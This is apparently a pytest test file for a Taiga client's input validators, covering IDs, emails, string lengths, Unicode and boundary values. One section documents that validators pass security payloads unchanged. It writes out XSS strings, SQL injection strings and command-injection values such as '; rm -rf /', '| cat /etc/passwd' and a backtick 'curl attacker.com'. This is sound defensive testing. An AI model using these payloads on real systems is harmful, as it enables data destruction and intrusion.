"""
Unit tests for the validators module.
Tests all validation functions to ensure proper input validation.
"""

import pytest

from src.validators import (
    ValidationError,
    get_allowed_kwargs_for_resource,
    validate_description,
    validate_email,
    validate_epic_id,
    validate_issue_id,
    validate_kwargs,
    validate_milestone_id,
    validate_name,
    validate_positive_integer,
    validate_project_id,
    validate_slug,
    validate_string_length,
    validate_subject,
    validate_task_id,
    validate_user_id,
    validate_user_story_id,
)


class TestPositiveIntegerValidation:
    """Test cases for validate_positive_integer"""

    def test_valid_positive_integer(self):
        """Should accept positive integers"""
        assert validate_positive_integer(1, "test_field") == 1
        assert validate_positive_integer(100, "test_field") == 100
        assert validate_positive_integer(999999, "test_field") == 999999

    def test_valid_string_integer(self):
        """Should convert string integers to int"""
        assert validate_positive_integer("42", "test_field") == 42

    def test_zero_rejected(self):
        """Should reject zero"""
        with pytest.raises(ValidationError, match="must be a positive integer"):
            validate_positive_integer(0, "test_field")

    def test_negative_integer_rejected(self):
        """Should reject negative integers"""
        with pytest.raises(ValidationError, match="must be a positive integer"):
            validate_positive_integer(-5, "test_field")

    def test_float_rejected(self):
        """Should reject non-integer floats"""
        with pytest.raises(ValidationError, match="must be an integer"):
            validate_positive_integer(3.14, "test_field")

    def test_invalid_string_rejected(self):
        """Should reject non-numeric strings"""
        with pytest.raises(ValidationError, match="must be an integer"):
            validate_positive_integer("abc", "test_field")

    def test_none_rejected(self):
        """Should reject None"""
        with pytest.raises(ValidationError, match="must be an integer"):
            validate_positive_integer(None, "test_field")


class TestStringLengthValidation:
    """Test cases for validate_string_length"""

    def test_valid_string(self):
        """Should accept valid strings"""
        assert validate_string_length("hello", "test_field") == "hello"
        assert validate_string_length("a", "test_field", max_length=10) == "a"

    def test_empty_string_rejected(self):
        """Should reject empty strings"""
        with pytest.raises(ValidationError, match="cannot be empty"):
            validate_string_length("", "test_field")

    def test_whitespace_only_rejected(self):
        """Should reject whitespace-only strings"""
        with pytest.raises(ValidationError, match="cannot be empty"):
            validate_string_length("   ", "test_field")

    def test_exceeds_max_length(self):
        """Should reject strings exceeding max length"""
        with pytest.raises(ValidationError, match="exceeds maximum length"):
            validate_string_length("a" * 1001, "test_field", max_length=1000)

    def test_non_string_rejected(self):
        """Should reject non-string types"""
        with pytest.raises(ValidationError, match="must be a string"):
            validate_string_length(123, "test_field")

    def test_at_max_length(self):
        """Should accept strings at max length"""
        s = "a" * 100
        assert validate_string_length(s, "test_field", max_length=100) == s


class TestEmailValidation:
    """Test cases for validate_email"""

    def test_valid_email(self):
        """Should accept valid email addresses"""
        assert validate_email("user@example.com") == "user@example.com"
        assert validate_email("john.doe+tag@domain.co.uk") == "john.doe+tag@domain.co.uk"

    def test_empty_email_rejected(self):
        """Should reject empty email"""
        with pytest.raises(ValidationError, match="cannot be empty"):
            validate_email("")

    def test_whitespace_only_rejected(self):
        """Should reject whitespace-only email"""
        with pytest.raises(ValidationError, match="cannot be empty"):
            validate_email("   ")

    def test_invalid_format_rejected(self):
        """Should reject invalid email formats"""
        invalid_emails = [
            "notanemail",
            "missing@domain",
            "@nodomain.com",
            "user@",
            "user name@example.com",
        ]
        for email in invalid_emails:
            with pytest.raises(ValidationError, match="Invalid email format"):
                validate_email(email)

    def test_email_too_long_rejected(self):
        """Should reject emails exceeding 254 characters"""
        long_email = "a" * 250 + "@example.com"
        with pytest.raises(ValidationError, match="exceeds maximum length"):
            validate_email(long_email)

    def test_non_string_rejected(self):
        """Should reject non-string types"""
        with pytest.raises(ValidationError, match="must be a string"):
            validate_email(123)

    def test_whitespace_trimmed(self):
        """Should trim whitespace from email"""
        assert validate_email("  user@example.com  ") == "user@example.com"


class TestIDValidation:
    """Test cases for ID validation functions"""

    def test_project_id_validation(self):
        """Should validate project ID"""
        assert validate_project_id(1) == 1
        with pytest.raises(ValidationError):
            validate_project_id(0)

    def test_user_id_validation(self):
        """Should validate user ID"""
        assert validate_user_id(42) == 42
        with pytest.raises(ValidationError):
            validate_user_id(-1)

    def test_task_id_validation(self):
        """Should validate task ID"""
        assert validate_task_id(100) == 100
        with pytest.raises(ValidationError):
            validate_task_id("invalid")

    def test_issue_id_validation(self):
        """Should validate issue ID"""
        assert validate_issue_id(50) == 50
        with pytest.raises(ValidationError):
            validate_issue_id(None)

    def test_epic_id_validation(self):
        """Should validate epic ID"""
        assert validate_epic_id(999) == 999
        with pytest.raises(ValidationError):
            validate_epic_id(0)

    def test_user_story_id_validation(self):
        """Should validate user story ID"""
        assert validate_user_story_id(200) == 200
        with pytest.raises(ValidationError):
            validate_user_story_id(-10)

    def test_milestone_id_validation(self):
        """Should validate milestone ID"""
        assert validate_milestone_id(75) == 75
        with pytest.raises(ValidationError):
            validate_milestone_id("abc")


class TestFieldValidation:
    """Test cases for field-specific validation functions"""

    def test_subject_validation(self):
        """Should validate subject field"""
        assert validate_subject("Valid Subject") == "Valid Subject"
        with pytest.raises(ValidationError):
            validate_subject("")
        with pytest.raises(ValidationError):
            validate_subject("a" * 501)

    def test_description_validation(self):
        """Should validate description field"""
        assert validate_description("Valid description") == "Valid description"
        assert validate_description(None) is None
        with pytest.raises(ValidationError):
            validate_description("")

    def test_name_validation(self):
        """Should validate name field"""
        assert validate_name("Project Name") == "Project Name"
        with pytest.raises(ValidationError):
            validate_name("")
        with pytest.raises(ValidationError):
            validate_name("a" * 256)

    def test_slug_validation(self):
        """Should validate slug field"""
        assert validate_slug("valid-slug") == "valid-slug"
        assert validate_slug("valid-slug-123") == "valid-slug-123"

        with pytest.raises(ValidationError):
            validate_slug("")

        with pytest.raises(ValidationError, match="alphanumeric characters and hyphens"):
            validate_slug("invalid_slug")

        with pytest.raises(ValidationError, match="alphanumeric characters and hyphens"):
            validate_slug("invalid slug")


class TestKwargsValidation:
    """Test cases for kwargs validation"""

    def test_valid_kwargs(self):
        """Should accept valid kwargs"""
        allowed = {"field1", "field2", "field3"}
        kwargs = {"field1": "value1", "field2": "value2"}
        result = validate_kwargs(kwargs, allowed)
        assert result == kwargs

    def test_none_kwargs(self):
        """Should handle None kwargs"""
        result = validate_kwargs(None, {"field1"})
        assert result == {}

    def test_empty_kwargs(self):
        """Should handle empty kwargs"""
        result = validate_kwargs({}, {"field1"})
        assert result == {}

    def test_invalid_field_rejected(self):
        """Should reject invalid fields"""
        allowed = {"field1", "field2"}
        kwargs = {"field1": "value", "invalid_field": "value"}
        with pytest.raises(ValidationError, match="Invalid fields"):
            validate_kwargs(kwargs, allowed)

    def test_non_dict_kwargs_rejected(self):
        """Should reject non-dict kwargs"""
        with pytest.raises(ValidationError, match="must be a dictionary"):
            validate_kwargs("not a dict", {"field1"})

    def test_multiple_invalid_fields(self):
        """Should report multiple invalid fields"""
        allowed = {"field1"}
        kwargs = {"field1": "value", "bad1": "value", "bad2": "value"}
        with pytest.raises(ValidationError, match="Invalid fields"):
            validate_kwargs(kwargs, allowed)


class TestResourceKwargsAllowed:
    """Test cases for get_allowed_kwargs_for_resource"""

    def test_project_kwargs(self):
        """Should return allowed kwargs for project"""
        allowed = get_allowed_kwargs_for_resource("project")
        assert "description" in allowed
        assert "is_private" in allowed

    def test_epic_kwargs(self):
        """Should return allowed kwargs for epic"""
        allowed = get_allowed_kwargs_for_resource("epic")
        assert "description" in allowed
        assert "color" in allowed

    def test_user_story_kwargs(self):
        """Should return allowed kwargs for user_story"""
        allowed = get_allowed_kwargs_for_resource("user_story")
        assert "description" in allowed
        assert "assigned_to" in allowed
        assert "priority" in allowed

    def test_task_kwargs(self):
        """Should return allowed kwargs for task"""
        allowed = get_allowed_kwargs_for_resource("task")
        assert "description" in allowed
        assert "status" in allowed

    def test_issue_kwargs(self):
        """Should return allowed kwargs for issue"""
        allowed = get_allowed_kwargs_for_resource("issue")
        assert "description" in allowed
        assert "severity" in allowed

    def test_milestone_kwargs(self):
        """Should return allowed kwargs for milestone"""
        allowed = get_allowed_kwargs_for_resource("milestone")
        assert "name" in allowed

    def test_unknown_resource_rejected(self):
        """Should reject unknown resource types"""
        with pytest.raises(ValidationError, match="Unknown resource type"):
            get_allowed_kwargs_for_resource("unknown_resource")


class TestValidationErrorMessages:
    """Test that validation errors have clear, helpful messages"""

    def test_error_messages_include_field_name(self):
        """Error messages should include the field name"""
        with pytest.raises(ValidationError, match="project_id"):
            validate_project_id("invalid")

    def test_error_messages_are_specific(self):
        """Error messages should be specific about what was wrong"""
        with pytest.raises(ValidationError, match="positive integer"):
            validate_project_id(-5)

    def test_email_error_message_helpful(self):
        """Email validation error should be helpful"""
        with pytest.raises(ValidationError, match="Invalid email format"):
            validate_email("not-an-email")


# ============================================================================
# SECURITY PAYLOAD TESTS (20 tests)
# Documents that validators accept security payloads by design
# Sanitization occurs at the Taiga API layer, not validation layer
# ============================================================================


class TestSecurityPayloads:
    """Test that validators accept security payloads (sanitization at API layer)"""

    # XSS Payload Tests (8 tests)

    def test_xss_script_tag_in_subject(self):
        """Documents that XSS script tag passes validation"""
        xss = "<script>alert('xss')</script>"
        assert validate_subject(xss) == xss

    def test_xss_img_onerror_in_description(self):
        """IMG tag with onerror handler passes validation"""
        xss = "<img src=x onerror=alert('xss')>"
        assert validate_description(xss) == xss

    def test_xss_svg_onload_in_subject(self):
        """SVG with onload handler passes validation"""
        xss = "<svg onload=alert('xss')>"
        assert validate_subject(xss) == xss

    def test_xss_javascript_protocol_in_subject(self):
        """JavaScript protocol passes validation"""
        xss = "javascript:alert('xss')"
        assert validate_subject(xss) == xss

    def test_xss_iframe_injection_in_description(self):
        """Iframe with javascript source passes validation"""
        xss = "<iframe src='javascript:alert(\"xss\")'></iframe>"
        assert validate_description(xss) == xss

    def test_xss_body_onload_in_subject(self):
        """Body tag with onload handler passes validation"""
        xss = "<body onload=alert('xss')>"
        assert validate_subject(xss) == xss

    def test_xss_input_onfocus_in_subject(self):
        """Input with onfocus and autofocus passes validation"""
        xss = "<input onfocus=alert('xss') autofocus>"
        assert validate_subject(xss) == xss

    def test_xss_comment_injection_in_description(self):
        """HTML comment with script tag passes validation"""
        xss = "<!--<script>alert('xss')</script>-->"
        assert validate_description(xss) == xss

    # SQL Injection Tests (8 tests)

    def test_sql_drop_table_in_name(self):
        """DROP TABLE SQL injection pattern passes validation"""
        sql = "'; DROP TABLE users; --"
        assert validate_name(sql) == sql

    def test_sql_or_equals_in_subject(self):
        """OR 1=1 authentication bypass pattern passes"""
        sql = "' OR '1'='1"
        assert validate_subject(sql) == sql

    def test_sql_union_select_in_description(self):
        """UNION SELECT data extraction pattern passes"""
        sql = "' UNION SELECT * FROM passwords --"
        assert validate_description(sql) == sql

    def test_sql_delete_in_subject(self):
        """DELETE statement injection pattern passes"""
        sql = "1; DELETE FROM users; --"
        assert validate_subject(sql) == sql

    def test_sql_or_boolean_in_name(self):
        """OR 1=1 with comment passes"""
        sql = "' OR 1=1 --"
        assert validate_name(sql) == sql

    def test_sql_double_quote_variant_in_subject(self):
        """Double quote variant of SQL injection passes"""
        sql = '") OR ("1"="1'
        assert validate_subject(sql) == sql

    def test_sql_union_all_null_in_description(self):
        """UNION ALL NULL attack pattern passes"""
        sql = "' UNION ALL SELECT NULL,NULL,NULL --"
        assert validate_description(sql) == sql

    def test_sql_exec_procedure_in_subject(self):
        """Stored procedure execution pattern passes"""
        sql = "'; EXEC sp_executesql --"
        assert validate_subject(sql) == sql

    # Command Injection Tests (4 tests)

    def test_command_injection_rm_in_subject(self):
        """Dangerous rm command injection pattern passes"""
        cmd = "; rm -rf /"
        assert validate_subject(cmd) == cmd

    def test_command_injection_pipe_in_description(self):
        """Pipe operator command chaining passes"""
        cmd = "| cat /etc/passwd"
        assert validate_description(cmd) == cmd

    def test_command_injection_and_in_subject(self):
        """AND operator command chaining passes"""
        cmd = "&& whoami"
        assert validate_subject(cmd) == cmd

    def test_command_injection_backtick_in_name(self):
        """Backtick command execution passes"""
        cmd = "`curl attacker.com`"
        assert validate_name(cmd) == cmd


# ============================================================================
# BOUNDARY VALUE TESTS (15 tests)
# Tests exact limits and extreme values for string lengths and integers
# ============================================================================


class TestBoundaryValues:
    """Test boundary conditions for string lengths, integers, and collections"""

    # String Length Boundaries (5 tests)

    def test_string_at_max_subject_length(self):
        """Subject at exactly 500 chars should pass"""
        s = "x" * 500
        assert validate_subject(s) == s

    def test_string_over_max_subject_length(self):
        """Subject at 501 chars should fail"""
        s = "x" * 501
        with pytest.raises(ValidationError, match="exceeds maximum length"):
            validate_subject(s)

    def test_description_at_max_length_10k(self):
        """Description at exactly 10,000 chars should pass"""
        s = "x" * 10000
        assert validate_description(s) == s

    def test_very_long_string_10k_in_subject(self):
        """10k char string should fail gracefully for subject"""
        s = "x" * 10000
        with pytest.raises(ValidationError, match="exceeds maximum length"):
            validate_subject(s)

    def test_extremely_long_string_1M_chars(self):
        """1M char string should fail gracefully without hanging"""
        s = "x" * 1000000
        with pytest.raises(ValidationError, match="exceeds maximum length"):
            validate_subject(s)

    # Integer Boundaries (5 tests)

    def test_integer_boundary_max_int(self):
        """Test sys.maxsize integer (should pass - no upper limit enforced)"""
        import sys

        assert validate_project_id(sys.maxsize) == sys.maxsize

    def test_integer_boundary_2_31_minus_1(self):
        """Test 2^31-1 (max 32-bit signed int) should pass"""
        max_int_32 = 2147483647
        assert validate_project_id(max_int_32) == max_int_32

    def test_integer_boundary_2_63_minus_1(self):
        """Test 2^63-1 (max 64-bit signed int) should pass"""
        max_int_64 = 9223372036854775807
        assert validate_project_id(max_int_64) == max_int_64

    def test_integer_boundary_minimum_valid(self):
        """Test minimum valid ID (1) should pass"""
        assert validate_project_id(1) == 1

    def test_integer_boundary_zero_rejected(self):
        """Zero ID should be rejected"""
        with pytest.raises(ValidationError, match="must be a positive integer"):
            validate_project_id(0)

    # Collection Boundaries (5 tests)

    def test_empty_dict_kwargs_allowed(self):
        """Empty kwargs dict should pass"""
        assert validate_kwargs({}, {"field1"}) == {}

    def test_none_kwargs_converts_to_empty(self):
        """None kwargs should convert to empty dict"""
        assert validate_kwargs(None, {"field1"}) == {}

    def test_very_large_kwargs_dict(self):
        """Large dict with 100 valid fields should pass"""
        allowed = {f"field{i}" for i in range(100)}
        kwargs = {f"field{i}": f"value{i}" for i in range(100)}
        assert validate_kwargs(kwargs, allowed) == kwargs

    def test_nested_structure_in_kwargs(self):
        """Nested structures in kwargs values should pass (validation checks keys)"""
        allowed = {"config"}
        kwargs = {"config": {"nested": {"deep": {"value": 123}}}}
        assert validate_kwargs(kwargs, allowed) == kwargs

    def test_mixed_type_values_in_kwargs(self):
        """Mixed value types in kwargs should pass (validation checks keys only)"""
        allowed = {"field1", "field2", "field3"}
        kwargs = {"field1": "string", "field2": 123, "field3": ["list", "values"]}
        assert validate_kwargs(kwargs, allowed) == kwargs


# ============================================================================
# CHARACTER ENCODING TESTS (12 tests)
# Tests Unicode, escaped sequences, and special characters
# ============================================================================


class TestCharacterEncoding:
    """Test character encoding and special character handling"""

    # Unicode Tests (4 tests)

    def test_unicode_emoji_in_subject(self):
        """Emoji characters should pass validation"""
        emoji = "🔥 Hot feature 💻"
        assert validate_subject(emoji) == emoji

    def test_unicode_non_latin_scripts(self):
        """Non-Latin scripts (Chinese, Arabic, Hebrew) should pass"""
        text = "中文 العربية עברית"
        assert validate_subject(text) == text

    def test_unicode_combining_diacritics(self):
        """Combining diacritics should pass"""
        text = "café, niño, Zürich"
        assert validate_subject(text) == text

    def test_unicode_zero_width_characters(self):
        """Zero-width characters should pass"""
        text = "text\u200bwith\u200bzero\u200bwidth"
        assert validate_subject(text) == text

    # Escaped Sequences (4 tests)

    def test_null_byte_in_string(self):
        """Null byte should pass (Taiga API handles filtering)"""
        text = "text\x00null"
        assert validate_subject(text) == text

    def test_control_characters_in_string(self):
        """Control characters should pass"""
        text = "text\x01\x02\x1f"
        assert validate_subject(text) == text

    def test_high_bytes_in_string(self):
        """High bytes (0x80-0xff) should be handled"""
        text = "text\x80\xff"
        assert validate_subject(text) == text

    def test_mixed_escape_sequences(self):
        """Mixed escape sequences should pass"""
        text = "text\x00\xff\n\r\t"
        assert validate_subject(text) == text

    # Special Characters (4 tests)

    def test_quotes_in_subject(self):
        """Various quote types should pass"""
        text = "Text with 'single' and \"double\" and `backtick`"
        assert validate_subject(text) == text

    def test_backslashes_in_subject(self):
        """Backslashes should pass"""
        text = "path\\to\\file and \\n newline"
        assert validate_subject(text) == text

    def test_parentheses_in_subject(self):
        """Parentheses and brackets should pass"""
        text = "function(param) [index] {object}"
        assert validate_subject(text) == text

    def test_math_symbols_in_subject(self):
        """Math and comparison symbols should pass"""
        text = "value = x + y - z * 2 / 4 < 10 > 5"
        assert validate_subject(text) == text


# ============================================================================
# NULL/NONE HANDLING TESTS (8 tests)
# Tests None in required vs optional fields, empty collections, falsy values
# ============================================================================


class TestNullNoneHandling:
    """Test None/null handling and falsy value behavior"""

    # None in Required vs Optional Fields (3 tests)

    def test_none_in_description_allowed(self):
        """Description explicitly allows None (optional field by design)"""
        assert validate_description(None) is None

    def test_none_in_subject_rejected(self):
        """Subject does not allow None (required field)"""
        with pytest.raises(ValidationError, match="must be a string"):
            validate_subject(None)

    def test_none_in_name_rejected(self):
        """Name does not allow None (required field)"""
        with pytest.raises(ValidationError, match="must be a string"):
            validate_name(None)

    # Empty Collections (3 tests)

    def test_empty_dict_kwargs(self):
        """Empty dict is valid kwargs"""
        assert validate_kwargs({}, {"field1"}) == {}

    def test_none_kwargs_converted(self):
        """None kwargs converts to empty dict (not an error)"""
        assert validate_kwargs(None, {"field1"}) == {}

    def test_non_dict_kwargs_rejected(self):
        """Non-dict kwargs (like list) should be rejected"""
        with pytest.raises(ValidationError, match="must be a dictionary"):
            validate_kwargs(["list", "values"], {"field1"})

    # False/0 Values (2 tests)

    def test_zero_string_length_allowed_if_not_empty(self):
        """String with content passes (even if content is '0' or 'false')"""
        # Note: empty string "" is rejected, but "0" is valid
        assert validate_subject("0") == "0"
        assert validate_name("false") == "false"

    def test_boolean_and_zero_in_kwargs_values(self):
        """False and 0 values in kwargs are allowed (validation checks keys only)"""
        allowed = {"flag", "count"}
        kwargs = {"flag": False, "count": 0}
        assert validate_kwargs(kwargs, allowed) == kwargs
